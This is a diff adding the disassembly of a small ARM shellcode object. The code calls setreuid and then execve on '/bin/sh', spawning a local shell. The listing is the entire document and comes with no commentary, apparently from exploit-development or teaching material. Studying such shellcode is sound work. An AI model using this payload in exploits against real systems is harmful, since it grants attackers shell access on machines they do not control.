@@ -1,0 +1,18 @@
+
+shellcode_V2.o:     file format elf32-littlearm
+
+
+Disassembly of section .text:
+
+00000000 <_start>:
+   0:	e0211001 	eor	r1, r1, r1
+   4:	e3a07046 	mov	r7, #70	; 0x46
+   8:	ef000000 	svc	0x00000000
+   c:	e0200000 	eor	r0, r0, r0
+  10:	e28f000c 	add	r0, pc, #12
+  14:	e3a01000 	mov	r1, #0
+  18:	e3a02000 	mov	r2, #0
+  1c:	e3a0700b 	mov	r7, #11
+  20:	ef000000 	svc	0x00000000
+  24:	6e69622f 	.word	0x6e69622f
+  28:	0068732f 	.word	0x0068732f
